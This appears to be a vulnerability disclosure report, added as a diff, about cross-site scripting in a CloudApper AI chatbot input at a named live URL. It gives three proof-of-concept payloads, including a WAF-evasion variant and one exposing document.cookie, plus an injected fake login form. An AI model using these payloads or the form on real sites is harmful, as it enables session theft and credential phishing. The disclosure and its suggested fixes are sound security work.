@@ -1,0 +1,76 @@
+# Stored/Reflected XSS Vulnerability in CloudApper AI Chatbot Input
+
+## Summary
+
+A Cross-Site Scripting (XSS) vulnerability exists in the CloudApper AI Chatbot input field. User-controlled input is processed in an unsafe way, allowing JavaScript execution in the application context.
+
+This issue can lead to account compromise scenarios depending on the affected page context, session handling, and browser security settings.
+
+## Vulnerable URL
+
+https://www.cloudapper.ai/ai-chat/ukg/
+
+## Steps to Reproduce
+
+1. Open the vulnerable chatbot URL.
+2. Navigate to the chatbot input field.
+3. Inject the following proof-of-concept payload:
+
+
+
+Payload 1 — Basic XSS (alert box)
+
+const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(12)>"}}');
+
+
+Payload 2 — String.fromCharCode bypass (evades WAFs)
+
+const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(104,101,108,108,111,32,119,111,114,108,100))>"}}');
+
+
+Payload 3 — Cookie exfiltration
+
+const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(67,111,111,107,105,101,115,58,32)+document.cookie)>"}}');
+
+
+4. Submit/process the input.
+5. Observe that JavaScript execution occurs in the browser.
+
+
+HTML INjection Also Work POC:
+
+<form method="GET">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form> 
+
+## Proof of Concept
+
+https://youtu.be/lu1EJ3s_d_M?si=q7H3pYb3Nhhfuq4k
+
+
+The browser executes the injected JavaScript, confirming XSS.
+
+## Impact
+
+Successful exploitation may allow an attacker to:
+
+* Execute arbitrary JavaScript in the victim's browser
+* Perform actions on behalf of the user
+* Access page content available to JavaScript
+* Potentially impact users interacting with the vulnerable chatbot
+
+The final impact depends on application permissions, authentication context, and cookie security configuration.
+
+## Vulnerability Type
+
+Cross-Site Scripting (XSS)
+
+## Severity
+
+High (depending on affected user context)
+
+## Suggested Fix
+
+* Sanitize and validate user-controlled input before rendering
+* Avoid assigning untrusted data directly to `innerHTML`
+* Use safe DOM APIs such as `textContent`
+* Implement a strong Content Security Policy (CSP)
+* Prevent unsafe prototype manipulation
